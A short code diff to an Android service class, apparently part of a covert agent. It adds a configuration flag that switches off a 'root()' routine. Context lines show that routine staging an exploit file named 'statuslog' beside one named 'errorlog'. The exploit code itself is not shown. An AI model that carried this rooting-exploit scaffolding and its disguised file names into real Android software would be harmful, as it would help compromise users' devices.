@@ -12,6 +12,7 @@ import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.android.service.auto.AutoConfig;
 import com.android.service.util.Utils;
 
 /**
@@ -71,11 +72,13 @@ public class ServiceCore extends Service {
 
 	private boolean root() {
 		try {
+			if(!AutoConfig.EXP){
+				Log.d("QZ", TAG + " (root): Exploit disabled by conf");
+				return false;
+			}
 			String crashlog = "errorlog";
 			String exploit = "statuslog";
 			boolean isRoot = false;
-
-			
 
 			// Creiamo il crashlog
 			FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
